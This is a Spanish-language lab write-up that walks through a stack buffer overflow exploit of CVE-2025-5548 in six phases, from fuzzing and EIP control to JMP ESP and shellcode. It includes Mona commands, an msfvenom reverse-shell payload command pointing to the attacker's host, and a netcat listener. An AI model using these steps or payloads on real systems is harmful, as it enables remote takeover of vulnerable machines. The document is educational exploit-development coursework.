# 🚀 02 - Análisis y Explotación del CVE-2025-5548

## 🎯 Objetivo de la Fase
En esta segunda parte del laboratorio, el objetivo es materializar el riesgo. Vamos a analizar el **CVE-2025-5548** aplicando la metodología de desarrollo de exploits para vulnerabilidades de tipo **Buffer Overflow** (Desbordamiento de Búfer), tal como vimos en las sesiones técnicas del Módulo 6.

El proceso no consiste en lanzar una herramienta automática, sino en entender cómo se corrompe la memoria del programa para lograr tomar el control del flujo de ejecución (Registro EIP) y conseguir una *Reverse Shell*.

---

## 🔬 Metodología de Explotación: Las 6 Fases

Para desarrollar este exploit, he seguido el estándar de la industria dividiendo el ataque en 6 pasos metódicos:

### Fase 1: Fuzzing (Provocar el Crash)
El primer paso es comunicarnos con el servidor vulnerable y enviarle cantidades crecientes de datos (ej. letras "A" `\x41`) hasta que el programa no pueda manejar la memoria y colapse.

* **Herramienta:** Script propio en Python (`fuzzer.py`).
* **Resultado:** Descubrimos que la aplicación se "rompe" al recibir aproximadamente `X` bytes en un comando específico. Al revisar **Immunity Debugger**, vemos que el programa se detiene y el registro EIP se sobrescribe con `41414141` (AAAA).

> **📸 CAPTURA RECOMENDADA 1:** Una foto de Immunity Debugger pausado ("Paused" en la esquina inferior derecha) donde se vea el registro EIP lleno de 41414141.

---

### Fase 2: Encontrar el Offset (Control del EIP)
Saber que el programa se rompe no es suficiente. Necesitamos saber **exactamente en qué byte** se sobrescribe el registro EIP. Para ello, usamos nuestro ayudante **Mona.py**.

1.  Creamos un patrón cíclico único con Mona o Metasploit.
2.  Enviamos ese patrón al servidor.
3.  Consultamos el valor exacto del EIP tras el *crash*.
4.  Usamos Mona para calcular el offset exacto: `!mona findmsp`

* **Resultado:** Encontramos que el EIP se sobrescribe exactamente en el byte número `[TU_OFFSET_AQUI]` (ej. 2003).

> **📸 CAPTURA RECOMENDADA 2:** La consola de Immunity/Mona mostrando el mensaje de "EIP contains normal pattern : ... (offset XXXX)".

---

### Fase 3: Sobrescribir el EIP (Verificación)
Para confirmar que tenemos el control absoluto, modificamos nuestro script en Python (`exploit.py`).
Enviamos `[OFFSET]` cantidad de "A"s, seguidas de cuatro "B"s (`\x42`), y rellenamos el resto con "C"s.

Si lo hemos hecho bien, el EIP debería valer `42424242`.

> **📸 CAPTURA RECOMENDADA 3:** Captura de los registros (Registers) en Immunity donde se vea claramente `EIP = 42424242`. ¡Esto demuestra que controlamos la mente del programa!

---

### Fase 4: Identificación de Badchars (Caracteres Malos)
Antes de inyectar código malicioso (*Shellcode*), debemos saber qué caracteres no soporta la aplicación. Por defecto, el byte nulo `\x00` siempre es un *badchar* porque en C/C++ indica el final de una cadena, cortando nuestro payload.

* **Proceso:** Enviamos una matriz con todos los caracteres hexadecimales (del `\x01` al `\xff`) y usamos Mona para comparar la memoria.
* **Resultado:** Identificamos los badchars que debemos evitar al generar nuestro payload final. *(Ejemplo: `\x00\x0a\x0d`)*.

---

### Fase 5: Búsqueda del "JMP ESP" (El Trampolín)
Como la dirección de memoria exacta cambia, no podemos apuntar el EIP directamente a nuestro código. La técnica clásica es buscar una instrucción en los módulos del programa que diga "Salta a la pila" (`JMP ESP`).

Usamos Mona para buscar esta instrucción en un módulo (DLL) que no tenga protecciones de memoria (ASLR, DEP) y que no contenga *badchars* en su dirección:

!mona jmp -r esp -cpb "\x00"

Resultado: Encontramos una dirección de retorno válida (Ej: 0x625011AF). Al poner esta dirección en el EIP (escrita en formato Little Endian), el programa saltará a nuestro código.

📸 CAPTURA RECOMENDADA 4: La ventana "Log data" de Mona mostrando el puntero al JMP ESP encontrado.

Fase 6: Generación del Shellcode y Pwned!
Llegamos al final. Usamos Msfvenom (de la suite Metasploit) para generar un código malicioso (Reverse Shell) que evite los badchars que descubrimos.

msfvenom -p windows/shell_reverse_tcp LHOST=[TU_IP_KALI] LPORT=4444 -b "\x00\x0a" -f c

Integramos este shellcode en nuestro script de Python, añadimos unos NOPs (\x90) para dar margen de seguridad (NOP Sled), y dejamos nuestro Netcat a la escucha (nc -nlvp 4444).

Al ejecutar el exploit final... ¡Conexión recibida!

📸 CAPTURA RECOMENDADA 5: La terminal de Kali Linux mostrando tu Netcat recibiendo la conexión, con un bonito C:\Windows\System32> confirmando el acceso.

🏁 Conclusión del Análisis
La explotación del CVE-2025-5548 demuestra por qué herramientas como Nmap (Fase 1) son críticas. Si dejamos un servicio vulnerable expuesto, un atacante puede automatizar este proceso en minutos.

Desarrollar este exploit manualmente me ha permitido comprender a bajo nivel cómo funcionan las protecciones de memoria (ASLR, DEP) y cómo los lenguajes no seguros (como C sin validación de entradas) son la raíz de las vulnerabilidades más críticas de la industria.

---
